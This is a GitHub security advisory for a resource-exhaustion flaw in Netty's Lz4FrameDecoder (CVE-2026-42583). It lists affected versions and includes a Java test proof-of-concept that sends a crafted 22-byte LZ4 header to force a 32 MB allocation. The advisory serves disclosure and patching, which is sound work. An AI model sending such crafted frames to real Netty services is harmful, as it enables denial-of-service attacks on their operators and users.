# [H] Netty Lz4FrameDecoder is vulnerable to resource exhaustion 

## Summary
Severity: High
Advisory: GHSA-mj4r-2hfc-f8p6
CVE: CVE-2026-42583
CWE: CWE-400, CWE-770
Ecosystem: Maven
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-05-07
Source: https://github.com/advisories/GHSA-mj4r-2hfc-f8p6
Type: github-advisory

## Affected
- Maven: `io.netty:netty-codec-compression` — affected >=0 <4.2.13.Final
- Maven: `io.netty:netty-codec` — affected >=0 <4.1.133.Final

## Details
### Summary
Lz4FrameDecoder allocates a ByteBuf of size `decompressedLength` (up to 32 MB per block) before LZ4 runs. A peer only needs a 21-byte header plus `compressedLength` payload bytes - 22 bytes if `compressedLength == 1` - to force that allocation.

### Details
io.netty.handler.codec.compression.Lz4FrameDecoder#decode
Header fields are trusted for sizing. On the compressed path, after `readableBytes >= compressedLength`, the decoder does `ctx.alloc().buffer(decompressedLength, decompressedLength)` then decompresses.

### PoC
The test below demonstrates how an attacker sending 22 bytes will force the server to allocate 32MB

```java
    @Test
    void test() throws Exception {
        EventLoopGroup workerGroup = new MultiThreadIoEventLoopGroup(NioIoHandler.newFactory());
        try {
            AtomicReference<Throwable> serverError = new AtomicReference<>();
            CountDownLatch latch = new CountDownLatch(1);

            ServerBootstrap server = new ServerBootstrap()
                    .group(workerGroup)
                    .channel(NioServerSocketChannel.class)
                    .childHandler(new ChannelInitializer<SocketChannel>() {
                        @Override
                        protected void initChannel(SocketChannel ch) {
                            ch.pipeline()
                                    .addLast(new Lz4FrameDecoder())
                                    .addLast(new ChannelInboundHandlerAdapter() {
                                        @Override
                                        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {
                                            if (cause instanceof DecoderException) {
                                                serverError.set(cause.getCause());
                                            } else {
                                                serverError.set(cause);
                                            }
                                            latch.countDown();
                                        }
                                    });
                        }
                    });

            ChannelFuture serverChannel = server.bind(0).sync();

            Bootstrap client = new Bootstrap()
                    .group(workerGroup)
                    .channel(NioSocketChannel.class)
                    .handler(new ChannelInboundHandlerAdapter() {
                        @Override
                        public void channelActive(ChannelHandlerContext ctx) {
                            ByteBuf buf = ctx.alloc().buffer(22, 22);
                            buf.writeLong(MAGIC_NUMBER);
                            buf.writeByte(BLOCK_TYPE_COMPRESSED | 0x0F);
                            buf.writeIntLE(1);
                            buf.writeIntLE(1 << 25);
                            buf.writeIntLE(0);
                            buf.writeByte(0);

                            ctx.writeAndFlush(buf);

                            ctx.fireChannelActive();
                        }
                    });

            ChannelFuture clientChannel = client.connect(serverChannel.channel().localAddress()).sync();

            assertTrue(latch.await(10, TimeUnit.SECONDS));

            assertInstanceOf(IndexOutOfBoundsException.class, serverError.get());

            clientChannel.channel().close();
            serverChannel.channel().close();
        } finally {
            workerGroup.shutdownGracefully();
        }
    }
```

### Impact
Untrusted senders without per-channel / aggregate limits can stress memory with many small requests.

## References
- https://github.com/netty/netty/security/advisories/GHSA-mj4r-2hfc-f8p6
- https://nvd.nist.gov/vuln/detail/CVE-2026-42583
- https://github.com/netty/netty
